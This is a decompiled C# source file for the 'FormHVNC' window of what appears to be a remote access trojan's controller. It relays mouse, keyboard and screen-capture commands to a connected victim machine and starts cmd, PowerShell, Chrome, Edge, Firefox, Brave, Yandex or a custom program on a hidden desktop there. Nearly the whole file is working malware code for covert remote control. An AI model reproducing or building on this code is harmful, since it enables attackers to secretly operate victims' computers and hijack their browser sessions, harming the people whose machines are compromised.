using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000A8 RID: 168
	public partial class FormHVNC : FormMaterial
	{
		// Token: 0x060004F3 RID: 1267 RVA: 0x00045D40 File Offset: 0x00043F40
		public FormHVNC()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x060004F4 RID: 1268 RVA: 0x00045D90 File Offset: 0x00043F90
		private void FormDesktop_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
			this.pictureBox1.MouseMove += this.pictureBox1_MouseMove;
			this.pictureBox1.MouseDown += this.pictureBox1_MouseDown;
			this.pictureBox1.MouseUp += this.pictureBox1_MouseUp;
			this.pictureBox1.MouseDoubleClick += this.pictureBox1_MouseDoubleClick;
			this.pictureBox1.MouseWheel += this.pictureBox1_MouseWheel;
			base.KeyPreview = true;
			this.pictureBox1.Focus();
			base.KeyDown += this.FormRemoteDesktop_KeyDown;
			base.KeyUp += this.FormRemoteDesktop_KeyUp;
		}

		// Token: 0x060004F5 RID: 1269 RVA: 0x00045E6F File Offset: 0x0004406F
		private void ChangeScheme(object sender)
		{
			this.numericUpDown2.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x060004F6 RID: 1270 RVA: 0x00045E81 File Offset: 0x00044081
		private void Closing1(object sender, EventArgs e)
		{
			if (this.client != null)
			{
				this.client.Disconnect();
			}
		}

		// Token: 0x060004F7 RID: 1271 RVA: 0x00045E98 File Offset: 0x00044098
		private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.materialSwitch1.Checked)
			{
				this.client.Send(new object[]
				{
					"Capture",
					true,
					(byte)this.numericUpDown2.Value
				});
				return;
			}
			this.client.Send(new object[]
			{
				"Capture",
				false
			});
		}

		// Token: 0x060004F8 RID: 1272 RVA: 0x00045F0F File Offset: 0x0004410F
		private void numericUpDown2_ValueChanged(object sender, EventArgs e)
		{
			if (this.materialSwitch1.Checked)
			{
				this.client.Send(new object[]
				{
					"Quality",
					(byte)this.numericUpDown2.Value
				});
			}
		}

		// Token: 0x060004F9 RID: 1273 RVA: 0x00045F50 File Offset: 0x00044150
		private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.materialSwitch1.Checked)
				{
					Point point = new Point(e.X * this.screen.Width / this.pictureBox1.Width, e.Y * this.screen.Height / this.pictureBox1.Height);
					byte b = 0;
					if (e.Button == MouseButtons.Left)
					{
						b = 2;
					}
					if (e.Button == MouseButtons.Right)
					{
						b = 8;
					}
					this.client.Send(new object[]
					{
						"MouseClick",
						b,
						point.X,
						point.Y
					});
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004FA RID: 1274 RVA: 0x00046028 File Offset: 0x00044228
		private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.materialSwitch1.Checked)
				{
					Point point = new Point(e.X * this.screen.Width / this.pictureBox1.Width, e.Y * this.screen.Height / this.pictureBox1.Height);
					byte b = 0;
					if (e.Button == MouseButtons.Left)
					{
						b = 4;
					}
					if (e.Button == MouseButtons.Right)
					{
						b = 16;
					}
					this.client.Send(new object[]
					{
						"MouseClick",
						b,
						point.X,
						point.Y
					});
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004FB RID: 1275 RVA: 0x00046100 File Offset: 0x00044300
		private void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.materialSwitch1.Checked)
				{
					Point point = new Point(e.X * this.screen.Width / this.pictureBox1.Width, e.Y * this.screen.Height / this.pictureBox1.Height);
					this.client.Send(new object[]
					{
						"MouseDoubleClick",
						point.X,
						point.Y
					});
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004FC RID: 1276 RVA: 0x000461AC File Offset: 0x000443AC
		private void pictureBox1_MouseWheel(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.materialSwitch1.Checked)
				{
					if (e.Delta > 0)
					{
						this.client.Send(new object[]
						{
							"MouseWheel",
							true
						});
					}
					else
					{
						this.client.Send(new object[]
						{
							"MouseWheel",
							false
						});
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004FD RID: 1277 RVA: 0x0004622C File Offset: 0x0004442C
		private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.materialSwitch1.Checked)
				{
					Point point = new Point(e.X * this.screen.Width / this.pictureBox1.Width, e.Y * this.screen.Height / this.pictureBox1.Height);
					if (Math.Abs(point.X - this.point2.X) >= 15 || Math.Abs(point.Y - this.point2.Y) >= 15)
					{
						this.point2 = point;
						this.client.Send(new object[]
						{
							"MouseMove",
							point.X,
							point.Y
						});
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004FE RID: 1278 RVA: 0x0004631C File Offset: 0x0004451C
		private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
		{
			if (!this.materialSwitch1.Checked)
			{
				return;
			}
			if (!this.IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			if (this._keysPressed.Contains(e.KeyCode))
			{
				return;
			}
			this._keysPressed.Add(e.KeyCode);
			this.client.Send(new object[]
			{
				"KeyboardClick",
				true,
				(int)e.KeyCode
			});
		}

		// Token: 0x060004FF RID: 1279 RVA: 0x000463A4 File Offset: 0x000445A4
		private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
		{
			if (!this.materialSwitch1.Checked)
			{
				return;
			}
			if (!this.IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			this._keysPressed.Remove(e.KeyCode);
			this.client.Send(new object[]
			{
				"KeyboardClick",
				false,
				(int)e.KeyCode
			});
		}

		// Token: 0x06000500 RID: 1280 RVA: 0x00046416 File Offset: 0x00044616
		private bool IsLockKey(Keys key)
		{
			return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
		}

		// Token: 0x06000501 RID: 1281 RVA: 0x0004643E File Offset: 0x0004463E
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (!this.parrent.itsConnect)
			{
				base.Close();
			}
			if (this.client != null && !this.client.itsConnect)
			{
				base.Close();
			}
		}

		// Token: 0x06000502 RID: 1282 RVA: 0x0004646E File Offset: 0x0004466E
		private void cmdToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.client.Send(LEB128.Write(new object[]
			{
				"Run",
				"Cmd"
			}));
		}

		// Token: 0x06000503 RID: 1283 RVA: 0x00046496 File Offset: 0x00044696
		private void powerShellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.client.Send(LEB128.Write(new object[]
			{
				"Run",
				"Powershell"
			}));
		}

		// Token: 0x06000504 RID: 1284 RVA: 0x000464BE File Offset: 0x000446BE
		private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.client.Send(LEB128.Write(new object[]
			{
				"Run",
				"Edge"
			}));
		}

		// Token: 0x06000505 RID: 1285 RVA: 0x000464E6 File Offset: 0x000446E6
		private void chromeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.client.Send(LEB128.Write(new object[]
			{
				"Run",
				"Chrome"
			}));
		}

		// Token: 0x06000506 RID: 1286 RVA: 0x0004650E File Offset: 0x0004470E
		private void braweToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.client.Send(LEB128.Write(new object[]
			{
				"Run",
				"Brave"
			}));
		}

		// Token: 0x06000507 RID: 1287 RVA: 0x00046536 File Offset: 0x00044736
		private void yandexToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.client.Send(LEB128.Write(new object[]
			{
				"Run",
				"Yandex"
			}));
		}

		// Token: 0x06000508 RID: 1288 RVA: 0x0004655E File Offset: 0x0004475E
		private void firefoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.client.Send(LEB128.Write(new object[]
			{
				"Run",
				"Firefox"
			}));
		}

		// Token: 0x06000509 RID: 1289 RVA: 0x00046588 File Offset: 0x00044788
		private void customToolStripMenuItem_Click(object sender, EventArgs e)
		{
			FormHVNCrun formHVNCrun = new FormHVNCrun();
			formHVNCrun.ShowDialog();
			if (formHVNCrun.Run)
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"RunCustom",
					formHVNCrun.rjTextBox1.Texts,
					formHVNCrun.rjTextBox2.Texts
				}));
			}
		}

		// Token: 0x04000390 RID: 912
		public int FPS;

		// Token: 0x04000391 RID: 913
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x04000392 RID: 914
		private List<Keys> _keysPressed = new List<Keys>();

		// Token: 0x04000393 RID: 915
		public Size screen;

		// Token: 0x04000394 RID: 916
		public Clients client;

		// Token: 0x04000395 RID: 917
		public Clients parrent;

		// Token: 0x04000396 RID: 918
		private Point point2 = new Point(0, 0);

		// Token: 0x04000397 RID: 919
		private const int threshold = 15;
	}
}
